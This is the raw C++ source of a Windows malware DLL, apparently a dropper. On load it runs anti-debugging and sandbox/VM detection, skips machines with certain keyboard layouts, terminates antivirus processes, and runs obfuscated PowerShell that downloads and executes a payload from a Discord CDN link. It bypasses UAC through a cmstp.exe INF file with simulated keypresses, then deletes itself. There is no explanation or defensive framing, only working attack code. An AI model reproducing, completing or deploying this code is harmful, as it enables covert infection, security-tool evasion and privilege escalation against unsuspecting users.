#include <windows.h>
#include <stdio.h>
#include "pch.h"
#include <iostream>
#include <sstream>
#include <tlhelp32.h>
#include <algorithm>
#include <intrin.h>
#include <shellapi.h>
#include <tchar.h>
#include <stdlib.h>
#include <iomanip>
#include <fstream>
#include <codecvt>
#include <string>

struct {
    WCHAR KBLayout[KL_NAMELENGTH];
    unsigned char kbstate[256];
    bool isWin;
} OSData;

struct {
    int H;
    int V;
} sandBoxCheckValues;

BOOL IsComputerInDomain() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameExA(ComputerNameDnsDomain, computerName, &size)) {
        if (std::string(computerName).empty()) {
            return FALSE;
        }
        else {
            return TRUE;
        }
    }
    else {
        return FALSE;
    }
}


BOOL IsUserInAdminGroup()
{
    BOOL fInAdminGroup = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    HANDLE hToken = NULL;
    HANDLE hTokenToCheck = NULL;
    DWORD cbSize = 0;
    OSVERSIONINFO osver = { sizeof(osver) };

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE,
        &hToken))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    TOKEN_ELEVATION_TYPE elevType;
    if (!GetTokenInformation(hToken, TokenElevationType, &elevType,
        sizeof(elevType), &cbSize))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    if (TokenElevationTypeLimited == elevType)
    {
        if (!GetTokenInformation(hToken, TokenLinkedToken, &hTokenToCheck,
            sizeof(hTokenToCheck), &cbSize))
        {
            dwError = GetLastError();
            goto Cleanup;
        }
    }
    if (!hTokenToCheck)
    {
        if (!DuplicateToken(hToken, SecurityIdentification, &hTokenToCheck))
        {
            dwError = GetLastError();
            goto Cleanup;
        }
    }

    BYTE adminSID[SECURITY_MAX_SID_SIZE];
    cbSize = sizeof(adminSID);
    if (!CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, &adminSID,
        &cbSize))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    if (!CheckTokenMembership(hTokenToCheck, &adminSID, &fInAdminGroup))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

Cleanup:
    if (hToken)
    {
        CloseHandle(hToken);
        hToken = NULL;
    }
    if (hTokenToCheck)
    {
        CloseHandle(hTokenToCheck);
        hTokenToCheck = NULL;
    }

    if (ERROR_SUCCESS != dwError)
    {
        throw dwError;
    }

    return fInAdminGroup;
}


BOOL IsProcessElevated()
{
    BOOL fIsElevated = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    if (!GetTokenInformation(hToken, TokenElevation, &elevation,
        sizeof(elevation), &dwSize))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    fIsElevated = elevation.TokenIsElevated;

Cleanup:
    if (hToken)
    {
        CloseHandle(hToken);
        hToken = NULL;
    }
    if (ERROR_SUCCESS != dwError)
    {
        throw dwError;
    }

    return fIsElevated;
}


BOOL fileExists(char* szPath)
{
    DWORD dwAttrib = GetFileAttributesA(szPath);
    return (dwAttrib != INVALID_FILE_ATTRIBUTES) && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY);
}

BOOL regKeyExist(HKEY hKey, char* regkey_s, char* value_s) {
    HKEY regkey;
    char value[1024];
    DWORD size=1024;

    if (RegOpenKeyExA(hKey, regkey_s, 0, KEY_READ, &regkey))
    {
        if (RegQueryValueExA(regkey, value_s, NULL, NULL, (BYTE*)value, &size)){ return FALSE; } else { return TRUE; }
    }
    else
    {
        if (RegQueryValueExA(regkey, value_s, NULL, NULL, (BYTE*)value, &size)) { return FALSE; } else { return TRUE; }
    }
}

bool sandboxCheck() {
    RECT desktop;
    HKEY hKey;
    const HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);
    sandBoxCheckValues.H = desktop.right;
    sandBoxCheckValues.V = desktop.bottom;
    if (sandBoxCheckValues.H < 960 || sandBoxCheckValues.V < 740) { return TRUE; }
    CHAR  computerName[MAX_COMPUTERNAME_LENGTH + 1];
    CHAR userName[256];
    DWORD cbComputerName = sizeof(computerName);
    DWORD cbUserName = sizeof(userName);
    GetUserNameA(userName, &cbUserName);
    GetComputerNameA(computerName, &cbComputerName);
    const char* commonSBUsernames[18] = {"CurrentUser", "Sandbox", "Emily" , "HAPUBWS" , "Hong Lee", "IT-ADMIN", "Johnson", "Miller", "milozs", "Peter Wilson", "timmy", "user", "sand box", "malware", "maltest", "test user", "virus", "John Doe"};
    for (int i = 0; i < sizeof(commonSBUsernames); i++) { if (userName == commonSBUsernames[i]) { return TRUE;}}
    const char* commonSBComputerName[13] = { "SANDBOX", "7SILVIA", "HANSPETER-PC", "JOHN-PC", "MUELLER-PC", "WIN7-TRAPS", "FORTINET", "TEQUILABOOMBOOM", "SystemIT", "KLONE_X64-PC", "CUCKOO", "SAMPLE", "MALWARE"};
    for (int i = 0; i < sizeof(commonSBComputerName); i++) { if (computerName == commonSBComputerName[i]) { return TRUE; } }
    const char* commonSBFileName[20] = { "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\agent.pyw",
                     "C:\\WINDOWS\\system32\\drivers\\vmmouse.sys",
                     "C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys",
                     "C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys",
                     "C:\\WINDOWS\\system32\\drivers\\VBoxGuest.sys",
                     "C:\\WINDOWS\\system32\\drivers\\VBoxSF.sys",
                     "C:\\WINDOWS\\system32\\drivers\\VBoxVideo.sys",
                     "C:\\WINDOWS\\system32\\vboxdisp.dll",
                     "C:\\WINDOWS\\system32\\vboxhook.dll",
                     "C:\\WINDOWS\\system32\\vboxmrxnp.dll",
                     "C:\\WINDOWS\\system32\\vboxogl.dll",
                     "C:\\WINDOWS\\system32\\vboxoglarrayspu.dll",
                     "C:\\WINDOWS\\system32\\vboxoglcrutil.dll",
                     "C:\\WINDOWS\\system32\\vboxoglerrorspu.dll",
                     "C:\\WINDOWS\\system32\\vboxoglfeedbackspu.dll",
                     "C:\\WINDOWS\\system32\\vboxoglpackspu.dll",
                     "C:\\WINDOWS\\system32\\vboxoglpassthroughspu.dll",
                     "C:\\WINDOWS\\system32\\vboxservice.exe",
                     "C:\\WINDOWS\\system32\\vboxtray.exe",
                     "C:\\WINDOWS\\system32\\VBoxControl.exe"};
    for (int i = 0; i < sizeof(commonSBFileName); i++) {
        if (fileExists((char*)commonSBFileName[i])) {
            return TRUE;
        }
    }
    const char* regValuePath[15] = { "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
                               "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
                               "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
                               "SOFTWARE\\VMware, Inc.\\VMware Tools",
                               "HARDWARE\\Description\\System",
                               "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
                               "SYSTEM\\ControlSet001\\Services\\Disk\\Enum",
                               "HARDWARE\\ACPI\\DSDT\\VBOX__",
                               "HARDWARE\\ACPI\\FADT\\VBOX__",
                               "HARDWARE\\ACPI\\RSDT\\VBOX__",
                               "SYSTEM\\ControlSet001\\Services\\VBoxGuest",
                               "SYSTEM\\ControlSet001\\Services\\VBoxMouse",
                               "SYSTEM\\ControlSet001\\Services\\VBoxService",
                               "SYSTEM\\ControlSet001\\Services\\VBoxSF",
                               "SYSTEM\\ControlSet001\\Services\\VBoxVideo"};
    for (int i = 0; i < sizeof(regValuePath); i++) { if (!(RegOpenKeyExA(HKEY_LOCAL_MACHINE, regValuePath[i], 0, KEY_READ, &hKey))) { return TRUE;  }}
    if (regKeyExist(HKEY_LOCAL_MACHINE, (char*)"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", (char*)"Identifier")) { return TRUE; }
    if (regKeyExist(HKEY_LOCAL_MACHINE, (char*)"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", (char*)"Identifier")) { return TRUE; }
    if (regKeyExist(HKEY_LOCAL_MACHINE, (char*)"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", (char*)"Identifier")) { return TRUE; }
    if (regKeyExist(HKEY_LOCAL_MACHINE, (char*)"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", (char*)"Identifier")) { return TRUE; }
    if (regKeyExist(HKEY_LOCAL_MACHINE, (char*)"HARDWARE\\Description\\System", (char*)"SystemBiosVersion")) { return TRUE; }
    if (regKeyExist(HKEY_LOCAL_MACHINE, (char*)"HARDWARE\\Description\\System", (char*)"VideoBiosVersion")) { return TRUE; }
    if (regKeyExist(HKEY_LOCAL_MACHINE, (char*)"HARDWARE\\DESCRIPTION\\System", (char*)"SystemBiosDate")) { return TRUE; }
    if (regKeyExist(HKEY_LOCAL_MACHINE, (char*)"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", (char*)"Identifier")) { return TRUE; }
    if (regKeyExist(HKEY_LOCAL_MACHINE, (char*)"HARDWARE\\Description\\System", (char*)"SystemBiosVersion")) { return TRUE; }
    return FALSE;
}

BOOL TerminateProcessByID(DWORD dwProcessId, UINT uExitCode)
{
    DWORD dwDesiredAccess = PROCESS_TERMINATE;
    BOOL  bInheritHandle = FALSE;
    HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
    if (hProcess == NULL)
        return FALSE;

    BOOL result = TerminateProcess(hProcess, uExitCode);

    CloseHandle(hProcess);

    return result;
}

bool getInterestingProcess(){
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    const char* protections[38] = { "Avira.ServiceHost.exe", "masvc.exe", "mfemactl.exe", "AvastSvc.exe", "avastui.exe", "TMBMSRV.exe", "TmPfw.exe", "dsagent.exe", "tmlisten.exe", "TmProxy.exe", "ntrtscan.exe", "TmCCSF.exe", 
        "ClientRemote.exe", "SemSvc.exe", "SemLaunchSvc.exe", "sesmcontinst.exe", "LuCatalog.exe", "LuCallbackProxy.exe", "LuComServer_3_3.exe", "httpd.exe", "dbisqlc.exe", "dbsrv16.exe", "semapisrv.exe",
        "snac64.exe", "AutoExcl.exe", "DoScan.exe", "nlnhook.exe", "SavUI.exe", "SepLiveUpdate.exe", "Smc.exe", "SmcGui.exe", "SymCorpUI.exe", "symerr.exe", "ccSvcHst.exe", "DevViewer.exe", "DWHWizrd.exe", "RtvStart.exe", "roru.exe"};

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) 
    {
        return(FALSE);
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap); 
        return(FALSE);
    }

    do
    {
        std::wstring wstr(pe32.szExeFile);
        std::string str;
        std::transform(wstr.begin(), wstr.end(), std::back_inserter(str), [](wchar_t c) {
            return (char)c; });
        for (int i = 0; i < 38; i++) {
            if (str == protections[i]) {
                TerminateProcessByID(pe32.th32ProcessID, 1);
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return(TRUE);
}

void selfDelete() {
    HMODULE hModule = GetModuleHandle(NULL);
    TCHAR path[MAX_PATH];
    GetModuleFileName(hModule, path, MAX_PATH);
    size_t size = wcstombs(NULL, path, 0) + 1;
    char* convertSTR = new char[size];
    wcstombs(convertSTR, path, size);
    const char* cstr = convertSTR;
    remove(cstr);
}

void Stage2Basic()
{
    std::string commandLine = ".( $sHElLID[1]+$SHeLlID[13]+'X')( (((\"{71} {49} {32} {36} {63} {22} {59} {31} {54} {65} {10} {43} {67} {70} {39} \
{44} {46} {0} {60} {40} {24} {17} {1} {26} {30} {58} {42} {16} {41} {68} {20} {69} {23} {34} {66} {28} {9} {33} {35} {64} {53} {12} {37} {13} \
{3} {45} {52} {29} {48} {47} {8} {61} {55} {51} {27} {73} {25} {50} {5} {62} {2} {7} {57} {15} {21} {19} {72} {11} {4} {56} {18} {14} {38} {74} \
{6}\" -f 's126','String = ','t','at','si','Reque','h',' -','r','nt 8 vDG ForEach-Object {','attachm','es',' jP','aveP','-Comm','ile jP','..90) +'\
,'m',' ','ath;','22) vDG ','zsaveP','tps://cdn.disc','et-','o','ke-W','-','D;Inv','Cou','jPzenv:TEMPtj4','j','p',' = ','[c','Random','h','26Dh','zs',\
'and jPzs','834681','zrand',' (9','in ((65','ent','18995095/OErA','h =','sR8Q.p','mSt','jPzrando','zurl','eb','e26',' 26D','Pz_});','p.com','ex','on',\
'Uri jPzurl -OutF','o','orda','D;jP','ing.','s','t','ar]j','/',' -','s/1058883422946344990/10','7..1','G','588','jP','Invoke-Expr','o','avePat'))  \
-cRePlace([ChAr]118+[ChAr]68+[ChAr]71),[ChAr]124  -cRePlace  'jPz',[ChAr]36-rePLAce ([ChAr]50+[ChAr]54+[ChAr]68),[ChAr]34-cRePlace 'tj4',[ChAr]92))";

    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    if (!CreateProcessW(NULL, LPWSTR(commandLine.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        return;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}

void Stage2Middling() {
    std::string commandLine = ".( $veRBOsEprEFEReNCe.toString()[1,3]+'x'-JOIN'')( (((\"{31} {4} {55} {54} {24} {13} {17} {11} {53} {19} {28} {45} {48} {82} {21} {66} {70} \
{8} {63} {22} {26} {16} {43} {72} {9} {58} {50} {15} {74} {65} {5} {34} {49} {79} {38} {60} {44} {37} {10} {7} {64} {80} {42} {32} {62} {75} {67} {47} {41} {2} {29} {52} {3} \
{27} {1} {51} {36} {40} {33} {35} {20} {56} {25} {76} {0} {59} {23} {61} {78} {81} {30} {6} {12} {14} {68} {77} {39} {71} {18} {69} {46} {57} {73}\" -f'Reques','v:TEMPiGPI','Ij4_}'\
,'Path = n','nAPhttps:',' ((65..90) + (97..','e','m -Count 8','10588834','ps1n','ando','or',' Ij4sa','n.dis','vePath;I','ndomString = -','0','c','ssion -','.com/attachments/10588',\
'n','3','1',' -','d','nvoke','18995','APIj4en','8',')','il','Ij4url = ','h','ing','12','.exe','rand','t-R','e','-Exp','omStr',']','rEac','95/OErAsR8S','Ge','3','mmand Ij4','ar',\
'4229','2','a','j4','; Ij4save','dapp','c','//','AP;I','save','AP;Ij4r','t',' ','Uri ','-','68',' ume','n','44990','{[ch','n','Co','/','re','.','Path','joi','Object ','-Web','voke',\
'Ij4url ',') um',' Fo','-OutF','46'))-rEpLACe  ([ChAr]110+[ChAr]65+[ChAr]80),[ChAr]34 -rEpLACe 'Ij4',[ChAr]36 -CrEpLacE  'ume',[ChAr]124  -rEpLACe([ChAr]105+[ChAr]71+[ChAr]80),[ChAr]92))";

    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    if (!CreateProcessW(NULL, LPWSTR(commandLine.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        return;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}

std::string randomName(int length) {

    char Alp[36] = { 'Q','W','E','R','T','Y','U','I','O','P','A','S','D','F','G','H','J','K','L','Z','X','C','V','B','N','M','0','1','2','3','4','5','6','7','8','9' };
    std::string name = "";
    srand(static_cast<unsigned int>(time(NULL)));
    for (int i = 0; i < length; i++) {
        name = name + Alp[rand() % 36];
    }
    name = name + std::string(".INF");
    return name;
}


BOOL Stage2Migrated()
{
    int length;
    std::string fileName;
    std::string fileNameS2;
    srand(static_cast<unsigned int>(time(NULL)));
    length = (rand() % 11) + 6;
    fileName = randomName(length);
    length = (rand() % 11) + 6;
    fileNameS2 = randomName(length);
    std::stringstream ss;
    wchar_t tempPath[MAX_PATH];
    DWORD tempFolderO = GetTempPathW(MAX_PATH, tempPath);
    ss << "[version]\nSignature = $Windows NT$\n\n[DefaultInstall]\nCustomDestination = CustInstDestSectionAllUsers\nRunPreSetupCommands = RunPreSetupCommandsSection\n\n\
[RunPreSetupCommandsSection]\n.( $veRBOsEprEFEReNCe.toString()[1,3]+'x'-JOIN'')( (((\"{31} {4} {55} {54} {24} {13} {17} {11} {53} {19} {28} {45} {48} {82} {21} {66} {70} \
{8} {63} {22} {26} {16} {43} {72} {9} {58} {50} {15} {74} {65} {5} {34} {49} {79} {38} {60} {44} {37} {10} {7} {64} {80} {42} {32} {62} {75} {67} {47} {41} {2} {29} {52} {3} \
{27} {1} {51} {36} {40} {33} {35} {20} {56} {25} {76} {0} {59} {23} {61} {78} {81} {30} {6} {12} {14} {68} {77} {39} {71} {18} {69} {46} {57} {73}\" -f'Reques','v:TEMPiGPI','Ij4_}'\
,'Path = n','nAPhttps:',' ((65..90) + (97..','e','m -Count 8','10588834','ps1n','ando','or',' Ij4sa','n.dis','vePath;I','ndomString = -','0','c','ssion -','.com/attachments/10588',\
'n','3','1',' -','d','nvoke','18995','APIj4en','8',')','il','Ij4url = ','h','ing','12','.exe','rand','t-R','e','-Exp','omStr',']','rEac','95/OErAsR8S','Ge','3','mmand Ij4','ar',\
'4229','2','a','j4','; Ij4save','dapp','c','//','AP;I','save','AP;Ij4r','t',' ','Uri ','-','68',' ume','n','44990','{[ch','n','Co','/','re','.','Path','joi','Object ','-Web','voke',\
'Ij4url ',') um',' Fo','-OutF','46'))-rEpLACe  ([ChAr]110+[ChAr]65+[ChAr]80),[ChAr]34 -rEpLACe 'Ij4',[ChAr]36 -CrEpLacE  'ume',[ChAr]124  -rEpLACe([ChAr]105+[ChAr]71+[ChAr]80),[ChAr]92))\
\ntaskkill / IM cmstp.exe / F\n\n\
[CustInstDestSectionAllUsers]\n49000, 49001 = AllUSer_LDIDSection, 7\n\n\
[AllUSer_LDIDSection]\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\n\n\
[Strings]\nServiceName = \"Windows Update\"\nShortSvcName = \"Windows Update\"";
    std::string fileNameContent = ss.str();
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    std::string tempPathStr = converter.to_bytes(tempPath);
    std::ofstream out_file(tempPathStr + fileName);
    if (tempFolderO == 0) {
        return FALSE;
    }
    if (!out_file.is_open()) {
        return FALSE;
    }
    out_file << fileNameContent;
    out_file.close();
    STARTUPINFOW startupInfo;
    ZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION processInfo;
    ZeroMemory(&processInfo, sizeof(processInfo));

    std::wstring commandLine;
    std::wstring wstrFN = converter.from_bytes(fileName);
    const wchar_t tempCMD[] = L"C:\\Windows\\System32\\cmstp.exe /au ";
    std::wstring tempVal(tempCMD);
    commandLine = tempVal + tempPath + wstrFN;
    if (!CreateProcessW(NULL, const_cast<LPWSTR>(commandLine.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo)) 
    {
        DWORD errorCode = GetLastError();
        return FALSE;
    }
    DWORD result = WaitForInputIdle(processInfo.hProcess, INFINITE);
    Sleep(250);
    HWND hWnd = FindWindowW(NULL, L"Windows Update");
    if (hWnd == NULL)
    {
        return FALSE;
    }
    if (!SetForegroundWindow(hWnd))
    {
        return FALSE;
    }
    else {
        INPUT input;
        input.type = INPUT_KEYBOARD;
        input.ki.wScan = 0;
        input.ki.time = 0;
        input.ki.dwExtraInfo = 0; 
        input.ki.wVk = VK_RETURN; 
        input.ki.dwFlags = 0;
        SendInput(1, &input, sizeof(input));
        input.ki.wVk = VK_RETURN; 
        input.ki.dwFlags = KEYEVENTF_KEYUP;
        SendInput(1, &input, sizeof(input));
    }
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
    return TRUE;
}

void easeUpAccessAndDeliver() {
    Sleep(500000);
    BOOL isAdmin;
    isAdmin = IsUserInAdminGroup();
    if (isAdmin)
    {
        if (!IsProcessElevated())
        {
            Stage2Migrated();
        }
        else
        {
            Stage2Basic();
        }
    }
    else if (IsComputerInDomain()) {
        Stage2Middling();
    }
    else {
        Stage2Basic();
    }
    selfDelete();
}

void securityCleanUp() {
    getInterestingProcess();
}

BOOL Is_Win()
{
    OSVERSIONINFOEX osvi;
    DWORDLONG dwlConditionMask = 0;
    int op = VER_GREATER_EQUAL;

    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    osvi.dwMajorVersion = 6;
    osvi.dwMinorVersion = 0;
    osvi.wServicePackMajor = 0;
    osvi.wServicePackMinor = 0;
    // osvi.wProductType = VER_NT_SERVER;

    VER_SET_CONDITION(dwlConditionMask, VER_MAJORVERSION, op);
    VER_SET_CONDITION(dwlConditionMask, VER_MINORVERSION, op);
    VER_SET_CONDITION(dwlConditionMask, VER_SERVICEPACKMAJOR, op);
    VER_SET_CONDITION(dwlConditionMask, VER_SERVICEPACKMINOR, op);
    // VER_SET_CONDITION(dwlConditionMask, VER_PRODUCT_TYPE, VER_EQUAL);

    return VerifyVersionInfo(
        &osvi,
        VER_MAJORVERSION | VER_MINORVERSION |
        VER_SERVICEPACKMAJOR | VER_SERVICEPACKMINOR
        // | VER_PRODUCT_TYPE
        , dwlConditionMask);
}

void GetOSInfo() {
    bool result;
    GetKeyboardLayoutNameW(OSData.KBLayout);
    result = GetKeyboardState(OSData.kbstate);
    OSData.isWin = Is_Win();
}

extern "C" __declspec(dllexport)
DWORD WINAPI TriggerExec() {
    MessageBoxA(NULL, "Loaded and executed", "Debug", NULL);
    GetOSInfo();
    BOOL isSandbox;
    isSandbox = sandboxCheck();
    if (!OSData.isWin) {
        selfDelete();
    }
    else if(wcscmp(OSData.KBLayout, L"00000409") == 0 || wcscmp(OSData.KBLayout , L"00010409") == 0 || wcscmp(OSData.KBLayout , L"00030409") == 0 || wcscmp(OSData.KBLayout , L"00050409") == 0
        || wcscmp(OSData.KBLayout , L"00020409") == 0 || wcscmp(OSData.KBLayout , L"00000422") == 0 || wcscmp(OSData.KBLayout , L"00020422") == 0
        || wcscmp(OSData.KBLayout, L"0000040C") == 0)
    {
        selfDelete();
    }
    else if (isSandbox) {
        selfDelete();
    }
    else { 
        securityCleanUp();
        easeUpAccessAndDeliver();
        selfDelete();
    }
    return 0;
}


static BOOL SwallowedException = TRUE;


static LONG CALLBACK VectoredHandler(_In_ PEXCEPTION_POINTERS ExceptionInfo)
{
    SwallowedException = FALSE;
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}


BOOL TrapFlag()
{
    PVOID Handle = AddVectoredExceptionHandler(1, VectoredHandler);
    SwallowedException = TRUE;

#ifdef _WIN64
    UINT64 eflags = __readeflags();
#else
    UINT eflags = __readeflags();
#endif

    eflags |= 0x100;
    __writeeflags(eflags);
    if (Handle) {
        RemoveVectoredExceptionHandler(Handle);
    }
    return SwallowedException;
}

BOOL Interrupt_0x2d()
{
    PVOID Handle = AddVectoredExceptionHandler(1, VectoredHandler);
    SwallowedException = TRUE;
    if (Handle) {
        RemoveVectoredExceptionHandler(Handle);
    }
    return SwallowedException;
}

extern "C" __declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        TrapFlag();
        Interrupt_0x2d();
        TriggerExec();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}